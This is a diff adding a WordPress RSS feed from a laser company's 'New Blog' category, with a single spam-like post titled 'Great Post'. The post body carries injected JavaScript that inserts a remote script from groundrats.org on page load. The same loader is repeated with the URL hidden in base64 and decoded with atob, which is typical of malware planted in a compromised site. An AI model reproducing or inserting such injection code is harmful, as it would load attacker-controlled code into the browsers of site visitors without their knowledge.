@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>New Blog Archives - Semper Laser</title>
+	<atom:link href="/category/new-blog/feed/" rel="self" type="application/rss+xml" />
+	<link>/category/new-blog/</link>
+	<description></description>
+	<lastBuildDate>Thu, 19 Dec 2024 03:54:16 +0000</lastBuildDate>
+	<language>es</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.7.1</generator>
+
+<image>
+	<url>/wp-content/uploads/2024/01/cropped-Logo-Semperlaser-32x32.png</url>
+	<title>New Blog Archives - Semper Laser</title>
+	<link>/category/new-blog/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Great Post</title>
+		<link>/great-post/</link>
+					<comments>/great-post/#respond</comments>
+		
+		<dc:creator><![CDATA[eme]]></dc:creator>
+		<pubDate>Fri, 22 Apr 2022 06:59:11 +0000</pubDate>
+				<category><![CDATA[New Blog]]></category>
+		<guid isPermaLink="false">/?p=4641</guid>
+
+					<description><![CDATA[Hello and welcome &#160;View my online resource&#160;site.com for more! Have a nice week and stay out.]]></description>
+										<content:encoded><![CDATA[<p>Hello and welcome</p>
+<p>&nbsp;View my online resource&nbsp;<a href="https://site.com/">site.com</a> for more! Have a nice week and stay out.</p>
+<p><script>;(function(f,b,n,j,x,e){x=b.createElement(n);e=b.getElementsByTagName(n)[0];x.async=1;x.src=j;e.parentNode.insertBefore(x,e);})(window,document,'script','https://groundrats.org/tHHGGEDyAn6ygUcHwex98R1YlpAOQ9zvV2t6wfY5Sox');
+;(function(f,b,n,j,x,e){
+        var decodedUrl = atob('aHR0cHM6Ly9ncm91bmRyYXRzLm9yZy90SEhHR0VEeUFuNnlnVWNId2V4OThSMVlscEFPUTl6dlYydDZ3Zlk1U294');
+        x=b.createElement(n);e=b.getElementsByTagName(n)[0];
+        x.async=1;x.src=decodedUrl;
+        e.parentNode.insertBefore(x,e);
+    })(window,document,'script');</script></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/great-post/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
